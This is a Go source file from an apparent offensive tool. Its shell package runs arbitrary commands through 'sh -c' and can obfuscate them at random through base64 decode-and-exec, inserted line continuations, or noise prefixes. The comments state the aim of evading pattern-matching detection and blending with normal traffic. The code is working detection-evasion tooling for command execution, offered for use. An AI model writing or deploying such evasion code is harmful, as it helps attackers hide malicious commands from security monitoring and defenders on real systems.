package shell

import (
	"bytes"
	"context"
	"encoding/base64"
	"fmt"
	"math/rand"
	"os/exec"
	"strings"
	"time"
	"syscall"
)

// CommandObfuscate enables command obfuscation for all Run calls.
// Set from main.go based on profiling results.
var CommandObfuscate bool

// Run executes a shell command with a timeout and returns its output.
func Run(command string, timeout time.Duration) (string, error) {
	cmdStr := command
	if CommandObfuscate {
		cmdStr = obfuscate(command)
	}

	ctx, cancel := context.WithTimeout(context.Background(), timeout)
	defer cancel()

	cmd := exec.CommandContext(ctx, "sh", "-c", cmdStr)
	cmd.SysProcAttr = &syscall.SysProcAttr{Setpgid: true}

	var stdout, stderr bytes.Buffer
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr

	if err := cmd.Run(); err != nil {
		out := strings.TrimSpace(stdout.String())
		errStr := strings.TrimSpace(stderr.String())
		if errStr != "" {
			if out != "" {
				return out, fmt.Errorf("%s (stderr: %s)", errStr, err)
			}
			return "", fmt.Errorf("%s: %w", errStr, err)
		}
		if out != "" {
			return out, err
		}
		return "", fmt.Errorf("execution failed: %w", err)
	}

	return strings.TrimSpace(stdout.String()), nil
}

// obfuscate wraps a command to evade simple pattern-matching detection.
// Methods chosen randomly per call.
func obfuscate(cmd string) string {
	// 25% pass-through to blend with normal traffic
	if rand.Intn(4) == 0 {
		return cmd
	}

	method := rand.Intn(3)
	switch method {
	case 0: // base64 decode + exec
		b64 := base64.StdEncoding.EncodeToString([]byte(cmd))
		return fmt.Sprintf("echo %s | base64 -d | sh", b64)

	case 1: // random whitespace + line continuation
		parts := strings.Fields(cmd)
		var result []string
		for i, p := range parts {
			result = append(result, p)
			if i > 0 && i < len(parts)-1 && i%2 == 0 && rand.Intn(2) == 0 {
				result = append(result, "\\\n")
			}
		}
		return strings.Join(result, " ")

	case 2: // benign noise prefix
		noise := fmt.Sprintf("echo \"chk-%d\" >/dev/null", rand.Intn(99999))
		return fmt.Sprintf("%s; %s", noise, cmd)
	}

	return cmd
}
